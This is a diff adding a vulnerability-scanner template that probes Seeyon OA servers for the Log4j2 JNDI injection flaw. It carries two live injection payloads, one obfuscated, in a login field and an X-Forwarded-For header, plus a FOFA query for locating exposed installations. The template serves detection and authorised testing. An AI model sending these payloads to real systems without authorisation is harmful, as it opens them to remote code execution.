@@ -1,0 +1,31 @@
+id: seeyon-oa-log4j2
+
+info:
+  name: Seeyon OA Log4j2
+  author: zp857
+  severity: critical
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,log4j2
+  metadata:
+    fofa-query: 'app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server") || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/" || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/") || (body="A8-V5企业版" && body="/seeyon/"))'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/main.do?method=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login_username=${jnd${::-i}:ldap://{{interactsh-url}}}
+
+      - |
+        GET /seeyon/main.do HTTP/1.1
+        Host: {{Hostname}}
+        X-forwarded-for: ${jndi:ldap://{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
